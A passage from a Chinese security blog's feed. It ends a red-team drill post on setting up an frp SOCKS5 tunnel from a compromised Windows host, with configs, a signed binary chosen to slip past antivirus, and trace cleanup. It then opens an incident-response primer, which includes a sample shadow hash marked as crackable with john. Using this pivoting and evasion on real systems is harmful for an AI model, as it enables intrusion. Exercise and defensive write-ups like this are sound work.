src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936264.png" alt="image-20240704172334839"></p><p>权限已提升为system*</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936639.png" alt="image-20240704172339801"></p><p>接下来重点<br>目标机上传frpc.exe和frpc.ini<br>上传的frpc.exe应该是带签名的0.34.1的Frpc.exe，如若是裸frp落地火绒会直接杀的<br>（印象中MID目标机frpc连接超时，而另一台目标机可以连接成功的原因是另一台目标机用的是0.45版本的Erfrp代理工具并且frpc与frps版本相对应）<br>由于之前实战中目标机器运行frpc不成功总结一下原因<br>1.frpc与frps版本不一致<br>windows查看文件命令<br>2.frpc.ini与frps.ini的token配置不一致（连接超时错误）<br>3.frpc.ini配置server_addr &#x3D; ip地址与服务器地址不一致</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936134.png" alt="image-20240704172348154"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.52.128</span><br><span class="line">server_port = 7000</span><br><span class="line">[plugin_socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6500</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = axu</span><br><span class="line">plugin_passwd = axu123456</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">dashboard_user = axu</span><br><span class="line">dashboard_pwd = axu123321</span><br></pre></td></tr></table></figure><p>[mid_socks5] 可能更偏向于某个软件或系统内部的中间层代理功能，而 [plugin_socks5] 则可能更偏向于某个软件或系统的插件系统中的代理功能扩展。</p><p>版本，配置文件对应后<br>shell Frpc -c frpc.ini连接成功</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936061.png" alt="image-20240704172459599"></p><p>SocksCap64测试代理服务器成功</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936976.png" alt="image-20240704172504199"></p><p>完成之后，切记删除上传的frpc.ini文件，kill杀掉Frpc.exe进程，如果是本机测试的话，维权的文件也删除，sleep 10</p>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;tag-plugin grid&quot; bg=&quot;card&quot; style=&quot;grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));&quot;&gt;&lt;div class=&quot;cell&quot; style=&quot;&quot;&gt;
   </summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://axusun01.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    <category term="红队" scheme="https://axusun01.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%BA%A2%E9%98%9F/"/>
    
    
    <category term="蓝队" scheme="https://axusun01.github.io/tags/%E8%93%9D%E9%98%9F/"/>
    
    <category term="攻防演练" scheme="https://axusun01.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="事件研判" scheme="https://axusun01.github.io/tags/%E4%BA%8B%E4%BB%B6%E7%A0%94%E5%88%A4/"/>
    
    <category term="应急响应" scheme="https://axusun01.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="安全运营" scheme="https://axusun01.github.io/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
  <entry>
    <title>应急响应基础</title>
    <link href="https://axusun01.github.io/2023/07/13/d9d69310/"/>
    <id>https://axusun01.github.io/2023/07/13/d9d69310/</id>
    <published>2023-07-13T02:00:47.000Z</published>
    <updated>2024-07-05T12:22:31.095Z</updated>
    
    <content type="html"><![CDATA[<div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 27.68K </p>    </div>    <div class="cell" style="">    <p>代码: 9.10K, 文本: 7.71K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.22 小时</p>    </div>    </div><h2 id="什么是应急响应"><a href="#什么是应急响应" class="headerlink" title="什么是应急响应"></a>什么是应急响应</h2><h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><blockquote><p>应急响应(Incident Response&#x2F;Emergency Response):</p><p>通常是指一个组织为了应对<mark class="tag-plugin colorful mark" color="red">各种意外事件</mark> 的发生所做的准备工作以及在突发事件发生时或者发生后所采取的措施</p><p>计算机网络应急响应的<mark class="tag-plugin colorful mark" color="red">对象是指计算机或网络所存储、传输、处理的信息的安全事件</mark>,事件的主体可能来自自然界、系统自身故障(这里的系统包括主机范畴内的问题,也包括网络范畴内的问题)、组织内部或外部的人、计算机病毒或蠕虫等</p></blockquote><h3 id="应急处置"><a href="#应急处置" class="headerlink" title="应急处置"></a>应急处置</h3><blockquote><p>启动应急响应计划后,应立即采取相关措施抑制信息安全事件影响,避免造成更大损失.在确定有效控制了信息安全事件影响后,开始实施恢复操作.恢复阶段的行动集中于建立临时业务处理能力、修复原系统的损害、在原系统或新设施中<strong>恢复运行业务能力</strong>等应急措施.</p><p>信息安全应急响应计划规范GB&#x2F;T 24363-2009</p></blockquote><h2 id="应急响应生命周期-PDCERF"><a href="#应急响应生命周期-PDCERF" class="headerlink" title="应急响应生命周期(PDCERF)"></a>应急响应生命周期(PDCERF)</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211021921420.png" data-fancybox="true"/></div></div><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p><strong>预防为主</strong></p><h4 id="微观"><a href="#微观" class="headerlink" title="微观"></a>微观</h4><ul><li>帮助服务对象建立安全政策</li><li>帮助服务对象按照安全政策配置安全设备和软件 扫描，风险分析，打补丁 如有条件且得到许可，建立监控设施</li></ul><h4 id="宏观"><a href="#宏观" class="headerlink" title="宏观"></a>宏观</h4><ul><li>建立协作体系和应急制度</li><li>建立信息沟通渠道和通报机制 <ul><li>电话、即时通讯、email</li></ul></li><li>如有条件，建立数据汇总分析的体系和能力 有关法律法规的制定</li></ul><h4 id="制定应急响应计划"><a href="#制定应急响应计划" class="headerlink" title="制定应急响应计划"></a>制定应急响应计划</h4><h4 id="资源准备"><a href="#资源准备" class="headerlink" title="资源准备"></a>资源准备</h4><ul><li>应急经费筹集</li><li>人力资源 <ul><li>指挥调度人员、协作人员</li><li>技术人员、专家</li><li>设备、系统和服务提供商</li></ul></li><li>硬件设备准备 <ul><li>数据保护设备（磁盘、SAN）、冗余设备 （网络链路、网络设备、关键计算机设备</li></ul></li><li>软件工具准备 <ul><li>备份软件、日志处理软件</li><li>系统软件、应急启动盘</li><li>病毒、恶意软件查杀软件</li></ul></li><li>现场备份</li><li>业务连续性保障 <ul><li>系统容灾、搭建临时业务系统</li></ul></li></ul><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="确定事件性质和处理人"><a href="#确定事件性质和处理人" class="headerlink" title="确定事件性质和处理人"></a>确定事件性质和处理人</h4><h4 id="微观（负责具体网络的CERT）"><a href="#微观（负责具体网络的CERT）" class="headerlink" title="微观（负责具体网络的CERT）"></a>微观（负责具体网络的CERT）</h4><ul><li>确定事件的责任人：指定一个责任人全权处理，事件，给予必要的资源</li><li>确定事件的性质： 误会？玩笑？还是恶意的攻击&#x2F;入侵？ 影响的严重程度， 预计采用什么样的专用资源来修复？</li></ul><h4 id="宏观（负责总体网络的CERT）"><a href="#宏观（负责总体网络的CERT）" class="headerlink" title="宏观（负责总体网络的CERT）"></a>宏观（负责总体网络的CERT）</h4><ul><li>通过汇总，确定是否发生了全网的大规模事件</li><li>确定应急等级，以决定启动哪一级应急方案</li></ul><h4 id="事故的标志（征兆和预兆）"><a href="#事故的标志（征兆和预兆）" class="headerlink" title="事故的标志（征兆和预兆）"></a>事故的标志（征兆和预兆）</h4><ul><li>Web服务器崩溃</li><li>用户抱怨主机连接网络速度过慢</li><li>子邮件管理员可以看到大批的反弹电子邮件与可疑内容</li><li>网络管理员通告了一个不寻常的偏离典型的网络流量流向</li></ul><h4 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h4><ul><li>网络和主机IDS 、防病毒软件、文件完整性检查软件、系统、网络、蜜罐日志</li><li>公开可利用的信息、第三方监视服务</li></ul><h4 id="确认事故"><a href="#确认事故" class="headerlink" title="确认事故"></a>确认事故</h4><ul><li>确认网络和系统轮廓： 分析事故的最好技术方法之一</li><li>理解正常的行为： 基于处理事故的良好准备</li><li>使用集中的日志管理并创建日志保留策略</li><li>执行事件关联</li><li>保持所有主机时钟同步</li><li>维护和使用信息知识库： 分析事故时的快速参考</li><li>使用互联网搜索引擎进行研究</li><li>运行包嗅探器以搜集更多的数据</li><li>过滤数据</li><li>经验是不可替代的</li><li>建立诊断矩阵</li><li>寻求帮助</li></ul><h4 id="诊断矩阵实例"><a href="#诊断矩阵实例" class="headerlink" title="诊断矩阵实例"></a>诊断矩阵实例</h4><table><thead><tr><th>征兆</th><th>拒绝服务</th><th>恶意代码</th><th>非授权访问</th><th>不正确使用</th></tr></thead><tbody><tr><td>文件，关键，访问尝试</td><td>低</td><td>中</td><td>高</td><td>低</td></tr><tr><td>文件，不适当的内容</td><td>低</td><td>中</td><td>低</td><td>高</td></tr><tr><td>主机崩溃</td><td>中</td><td>中</td><td>中</td><td>低</td></tr><tr><td>端口扫码，输入的， 不正常的</td><td>高</td><td>低</td><td>中</td><td>低</td></tr><tr><td>端口扫码，输出的， 不正常的</td><td>低</td><td>高</td><td>中</td><td>低</td></tr><tr><td>利用带宽高</td><td>高</td><td>中</td><td>低</td><td>中</td></tr><tr><td>利用电子邮件</td><td>中</td><td>高</td><td>中</td><td>中</td></tr></tbody></table><h3 id="遏制"><a href="#遏制" class="headerlink" title="遏制"></a>遏制</h3><p><strong>即时采取的行动</strong></p><h4 id="微观-1"><a href="#微观-1" class="headerlink" title="微观"></a>微观</h4><ul><li>防止进一步的损失，确定后果</li><li>初步分析，重点是确定适当的封锁方法</li><li>咨询安全政策</li><li>确定进一步操作的风险</li><li>损失最小化（最快最简单的方式恢复系统的基本功能，例如备机启动）</li><li>可列出若干选项，讲明各自的风险，由服务对象选择</li></ul><h4 id="宏观-1"><a href="#宏观-1" class="headerlink" title="宏观"></a>宏观</h4><ul><li>确保封锁方法对各网业务影响最小</li><li>通过协调争取各网一致行动，实施隔离</li><li>汇总数据，估算损失和隔离效果</li></ul><h4 id="建议组织机构为几类主要的事故建立单独的遏制策略"><a href="#建议组织机构为几类主要的事故建立单独的遏制策略" class="headerlink" title="建议组织机构为几类主要的事故建立单独的遏制策略"></a>建议组织机构为几类主要的事故建立单独的遏制策略</h4><p><strong>其标准包括：</strong></p><ul><li>潜在的破坏和资源的窃取</li><li><strong>证据保留的需要</strong></li><li>服务可用性（例如：网络连接，提供给外部当事方的服务）</li><li>实施战略需要的时间和资源</li><li>战略的有效性（例如：部分遏制事故，完全遏制事故）</li><li><strong>解决方案的期限</strong>（例如：紧急事故工作区需在4 小时内清除，临时工作区需在两周内清除，永久的解决方案）。</li></ul><h3 id="根除"><a href="#根除" class="headerlink" title="根除"></a>根除</h3><p><strong>长期的补救措施</strong></p><h4 id="微观-2"><a href="#微观-2" class="headerlink" title="微观"></a>微观</h4><ul><li>详细分析，确定原因，定义征兆</li><li>分析漏洞</li><li>加强防范</li><li>消除原因</li><li>修改安全政策</li></ul><h4 id="宏观-2"><a href="#宏观-2" class="headerlink" title="宏观"></a>宏观</h4><ul><li>加强宣传，公布危害性和解决办法，呼吁用户解决终端的问题；</li><li>加强检测工作，发现和清理行业与重点部门的问题</li></ul><h3 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h3><h4 id="微观-3"><a href="#微观-3" class="headerlink" title="微观"></a>微观</h4><ul><li>被攻击的系统恢复正常的工作状态</li><li>作一个新的备份</li><li>把所有安全上的变更作备份</li><li>服务重新上线</li><li>持续监控</li></ul><h4 id="宏观-3"><a href="#宏观-3" class="headerlink" title="宏观"></a>宏观</h4><ul><li>持续汇总分析，了解各网的运行情况</li><li>根据各网的运行情况判断隔离措施的有效性</li><li>通过汇总分析的结果判断仍然受影响的终端的规模</li><li>发现重要用户及时通报解决</li><li>适当的时候解除封锁措施</li></ul><h3 id="跟踪"><a href="#跟踪" class="headerlink" title="跟踪"></a>跟踪</h3><ul><li>关注系统恢复以后的安全状况，特别是曾经出问题的地方</li><li>建立跟踪文档，规范记录跟踪结果</li><li>对响应效果给出评估</li><li>对进入司法程序的事件，进行进一步的调查，打击违法犯罪活动</li><li>事件的归档与统计 <ul><li>处理人、时间和时段、地点</li><li>工作量、事件的类型、对事件的处置情况</li><li>代价、细节</li></ul></li></ul><h2 id="应急响应思路流程"><a href="#应急响应思路流程" class="headerlink" title="应急响应思路流程"></a>应急响应思路流程</h2><h3 id="1、收集信息"><a href="#1、收集信息" class="headerlink" title="1、收集信息"></a>1、收集信息</h3><p>在赶往出事地点的路上以及还没有接触到具体业务时，要提前向客户询问清楚事件情况，如发现时间以及大致发生时间、事件造成的破坏、受害主机情况(如系统、版本、内外网)、客户的具体处置要求</p><h3 id="2、事件预定性"><a href="#2、事件预定性" class="headerlink" title="2、事件预定性"></a>2、事件预定性</h3><p>在初步了解情况后先做一个<strong>事件性质预判</strong>，判断下这个事件是个什么事件，是勒索还是挖矿还是其他事件。然后根据事件发生时间划定一个<strong>时间范围</strong>，重点排查这个时间段内的情况，从影响范围中确认一个<strong>排查范围</strong>。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150353.png" data-fancybox="true"/></div></div><h3 id="3、取证分析"><a href="#3、取证分析" class="headerlink" title="3、取证分析"></a>3、取证分析</h3><p>通过事件的初步定性取证，并且有选择的优先分析重点内容。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150189.png" data-fancybox="true"/></div></div><h5 id="取证注意事项"><a href="#取证注意事项" class="headerlink" title="取证注意事项"></a>取证注意事项</h5><p><strong>保护</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">保证数据的安全性：制作磁盘映像——不在原始磁盘上操作</span><br><span class="line"></span><br><span class="line">保证数据完整性：取证中不使用可能破坏完整性的操作</span><br><span class="line"></span><br><span class="line">第三方监督：所有操作都有第三方在场监督</span><br></pre></td></tr></table></figure><p><strong>提取</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">优先提取易消失的证据：内存信息、系统进程、网络连接信息、路由信息、临时文件、缓存等</span><br><span class="line"></span><br><span class="line">文件系统：数据恢复、隐藏文件、加密文件、回收站、注册表、系统日志等</span><br><span class="line"></span><br><span class="line">应用系统：系统日志、中间件日志</span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">证据在什么地方：日志、删除的文件、临时文件、缓存</span><br><span class="line"></span><br><span class="line">从证据中能发现什么？如何关联证据？</span><br></pre></td></tr></table></figure><h3 id="4、定向分析"><a href="#4、定向分析" class="headerlink" title="4、定向分析"></a>4、定向分析</h3><p>二次定性后，我们基本已经真正掌握了事件情况，这时就可以进行各种分析，对各种情况利用各种工具快速分析</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150240.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150398.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261150209.png" data-fancybox="true"/></div></div><h2 id="应急响应信息收集表"><a href="#应急响应信息收集表" class="headerlink" title="应急响应信息收集表"></a>应急响应信息收集表</h2><table><thead><tr><th>感染主机数</th><th>感染了多数台主机</th></tr></thead><tbody><tr><td>补丁情况</td><td>打了哪些补丁，是否存在补丁漏打</td></tr><tr><td>中毒现象</td><td>勒索&#x2F;挖矿&#x2F;DoS&#x2F;僵尸网络&#x2F;后门&#x2F;木马</td></tr><tr><td>客户名称</td><td>什么区域的什么客户</td></tr><tr><td>帐号密码</td><td>确认是否有弱密码</td></tr><tr><td>对外开发端口</td><td>对外开发了哪些端口</td></tr><tr><td>开启的服务</td><td>开启了哪些服务</td></tr><tr><td>操作系统版本</td><td>操作系统版本信息</td></tr><tr><td>客户需求</td><td>确认客户具体需求</td></tr></tbody></table><h2 id="响应流程"><a href="#响应流程" class="headerlink" title="响应流程"></a>响应流程</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211021921528.png" data-fancybox="true"/></div></div><h3 id="事件发生"><a href="#事件发生" class="headerlink" title="事件发生"></a>事件发生</h3><p>运维监控人员、客服审核人员等发现问题，向上通报。</p><h3 id="事件确认"><a href="#事件确认" class="headerlink" title="事件确认"></a>事件确认</h3><p>收集事件信息、分析网络活动相关程序，日志和数据，判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等。</p><h3 id="事件响应"><a href="#事件响应" class="headerlink" title="事件响应"></a>事件响应</h3><p>各部门通力合作，处理安全问题，具体解决问题，避免存在漏洞未修补、后门未清除等残留问题。</p><h3 id="事件关闭"><a href="#事件关闭" class="headerlink" title="事件关闭"></a>事件关闭</h3><p>处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程。</p><h2 id="事件分类"><a href="#事件分类" class="headerlink" title="事件分类"></a>事件分类</h2><ul><li>病毒、木马、蠕虫事件</li><li>Web服务器入侵事件</li><li>第三方服务入侵事件</li><li>系统入侵事件<ul><li>利用Windows漏洞攻击操作系统</li></ul></li><li>网络攻击事件<ul><li>DDoS &#x2F; ARP欺骗 &#x2F; DNS劫持等</li></ul></li></ul><h2 id="分析方向"><a href="#分析方向" class="headerlink" title="分析方向"></a>分析方向</h2><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><ul><li>基于变化的分析</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">日期</span><br><span class="line">文件增改</span><br><span class="line">最近使用文件</span><br></pre></td></tr></table></figure><ul><li>源码分析</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检查源码改动</span><br><span class="line">查杀WebShell等后门</span><br></pre></td></tr></table></figure><ul><li>系统日志分析</li><li>应用日志分析</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">分析User-Agent，e.g. awvs / burpsuite / w3af / nessus / openvas</span><br><span class="line">对每种攻击进行关键字匹配, e.g. select/alert/eval</span><br><span class="line">异常请求，连续的404或者500</span><br></pre></td></tr></table></figure><ul><li><code>md5sum</code> 检查常用命令二进制文件的哈希，检查是否被植入<code>rootkit</code></li></ul><h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><ul><li>符合以下特征的进程</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CPU或内存资源占用长时间过高</span><br><span class="line">没有签名验证信息</span><br><span class="line">没有描述信息的进程</span><br><span class="line">进程的路径不合法</span><br></pre></td></tr></table></figure><ul><li><code>dump</code>系统内存进行分析</li><li>正在运行的进程</li><li>正在运行的服务</li><li>父进程和子进程</li><li>后台可执行文件的完整哈希</li><li>已安装的应用程序</li><li>运行着密钥或其他正在自动运行的持久化程序</li><li>计划任务</li></ul><h3 id="身份信息分析"><a href="#身份信息分析" class="headerlink" title="身份信息分析"></a>身份信息分析</h3><ul><li>本地以及域账号用户</li><li>异常的身份验证</li><li>非标准格式的用户名</li></ul><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ul><li>杀软检测记录</li></ul><h3 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h3><ul><li>防火墙配置</li><li>DNS配置</li><li>路由配置</li><li>监听端口和相关服务</li><li>最近建立的网络连接</li><li>RDP &#x2F; VPN &#x2F; SSH 等会话</li></ul><h3 id="配置分析"><a href="#配置分析" class="headerlink" title="配置分析"></a>配置分析</h3><ul><li>查看Linux SE等配置</li><li>查看环境变量</li><li>查看配套的注册表信息检索，SAM文件</li><li>内核模块</li></ul><h2 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202302161452524.png" data-fancybox="true"/></div></div><h3 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h3><ul><li>最近使用文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -ctime -2</span><br><span class="line">C:\Documents and Settings\Administrator\Recent</span><br><span class="line">C:\Documents and Settings\Default User\Recent</span><br><span class="line">%UserProfile%\Recent</span><br></pre></td></tr></table></figure><ul><li>系统日志分析</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/</span><br><span class="line">more /etc/rsyslog.conf <span class="comment"># 查看日志配置情况</span></span><br></pre></td></tr></table></figure><ul><li>重点分析位置</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 日志级别</span></span><br><span class="line">debug    <span class="comment"># 系统调试信息</span></span><br><span class="line">info     <span class="comment"># 常规信息</span></span><br><span class="line">warning  <span class="comment"># 警告信息</span></span><br><span class="line">err      <span class="comment"># 报错(级别低,阻止了某个功能能不能正常工作)</span></span><br><span class="line">crit     <span class="comment"># 报错(级别高,阻止了某个软件或整个系统不能正常工作)</span></span><br><span class="line">alert    <span class="comment"># 需要立即修改的信息</span></span><br><span class="line">emerg    <span class="comment"># 内核崩溃</span></span><br><span class="line">none     <span class="comment"># 不采集任何日志信息</span></span><br><span class="line"><span class="comment"># 注意:从上到下,级别从低到高,记录的信息越来越少</span></span><br><span class="line"><span class="comment"># 必看日志:secure、Messages、wtmp</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/etc/passwd   <span class="comment">#  用户列表</span></span><br><span class="line">/etc/init.d/  <span class="comment">#  开机启动项</span></span><br><span class="line">/etc/cron*    <span class="comment"># 定时任务</span></span><br><span class="line">/tmp          <span class="comment"># 临时目录</span></span><br><span class="line">~/.ssh</span><br><span class="line">/var/log/messages            <span class="comment"># 包括整体系统信息,其中也包含系统启动期间的日志.此外,mail,cron,daemon,kern和auth等内容也记录在var/log/messages日志中</span></span><br><span class="line"></span><br><span class="line">/var/log/dmesg              <span class="comment"># 包含内核缓冲信息(kernel ring buffer).在系统启动时,会在屏幕上显示许多与硬件有关的信息.可以用dmesg查看它们</span></span><br><span class="line">/var/log/auth.log           <span class="comment"># 包含系统授权信息,包括用户登录和使用的权限机制等</span></span><br><span class="line">/var/10g/boot.log           <span class="comment"># 包含系统启动时的日志</span></span><br><span class="line">/var/log/daemon.log         <span class="comment"># 包含各种系统后台守护进程日志信息</span></span><br><span class="line">/var/log/dpkg.log           <span class="comment"># 包括安装或dpkg命令清除软件包的日志</span></span><br><span class="line">/var/log/kern.log           <span class="comment"># 包含内核产生的日志,有助于在定制内核时解决问题</span></span><br><span class="line">/var/log/lastlog            <span class="comment"># 记录所有用户的最近信息.这不是一个ASCII文件,因此需要用lastlog命令查看内容</span></span><br><span class="line">/var/log/maillog  </span><br><span class="line">/var/log/mai1.<span class="built_in">log</span>           <span class="comment"># 包含来自系统运行电子邮件服务器的日志信息.例如:sendmail日志信息就全部送到这个文件中</span></span><br><span class="line">/var/log/user.log           <span class="comment"># 记录所有等级用户信息的日志</span></span><br><span class="line">/var/log/Xorg.x.log         <span class="comment"># 来自X的日志信息</span></span><br><span class="line">/var/log/alternatives.log   <span class="comment"># 更新替代信息都记录在这个文件中</span></span><br><span class="line">/var/log/btmp               <span class="comment"># 记录所有失败登录信息.使用last命令可以查看btmp文件.例如:last -f /var/log/btmp more</span></span><br><span class="line">/var/log/cups               <span class="comment"># 涉及所有打印信息的日志。</span></span><br><span class="line">/var/log/anaconda.log       <span class="comment"># 在安装Linux时,所有安装信息都储存在这个文件中</span></span><br><span class="line">/var/log/yum.log            <span class="comment"># 包含使用yum安装的软件包信息</span></span><br><span class="line">/var/log/cron               <span class="comment"># 每当cron进程开始一个工作时,就会将相关信息记录在这个文件中</span></span><br><span class="line">/var/log/secure             <span class="comment"># 包含验证和授权方面信息.例如:sshd 会将所有信息记录(其中包括失败登录)在这里</span></span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/utmp               <span class="comment"># 包含登录信息.使用wtmp可以找出谁正在登陆进入系统,谁使用命令显示这个文件或信息等</span></span><br><span class="line">/var/log/faillog            <span class="comment"># 包含用户登录失败信息.此外,错误登录命令也会记录在本文件中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 除了上述Log文件以外,vār/log还基于系统的具体应用包含以下一些子目录:</span></span><br><span class="line">/var/log/httpd/或/var/log/apache2        <span class="comment">#  包含服务器access_log和error_log信息</span></span><br><span class="line">/var/log/lighttpd/                       <span class="comment">#  包含light HTTPD的access_log和error_log</span></span><br><span class="line">/var/log/mail/                           <span class="comment">#  这个子目录包含邮件服务器的额外日志</span></span><br><span class="line">/var/log/prelink/                        <span class="comment">#  包含.so文件被prelink修改的信息</span></span><br><span class="line">/var/log/audit/                          <span class="comment">#  包含被Linux audit daemon储存的信息</span></span><br><span class="line">/var/log/samba/                          <span class="comment">#  包含由samba存储的信息</span></span><br><span class="line">/var/log/sa/                             <span class="comment">#  包含每日由sysstat软件包收集的sar文件</span></span><br><span class="line">/var/log/sssd/                           <span class="comment">#  用于守护进程安全服务</span></span><br></pre></td></tr></table></figure><h3 id="用户分析"><a href="#用户分析" class="headerlink" title="用户分析"></a>用户分析</h3><ul><li><code>/etc/shadow</code> 密码登陆相关信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$szBCA0J1J6UfTeGi<span class="variable">$VpIsYVHoULUix8Q</span>.ifya2Qjsf1zLkn0CMvvZqFAyfFvB9u/K7uk6pu4u1yN/P72Jim9tjDN1dMiSsrDRrOJQ..:19240:0:99999:7:::</span><br><span class="line">用户名:密码:密码上次修改时间:允许修改密码最短时间:允许修改密码最长时间:密码过期前提醒用户修改密码的时间</span><br><span class="line"><span class="comment"># 可以用john碰撞解密</span></span><br></pre></td></tr></table></figure><ul><li><code>uptime</code> 查看用户登陆时间</li><li><code>/etc/passwd</code> 用户基本信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">用户名:密码:用户<span class="built_in">id</span>:组<span 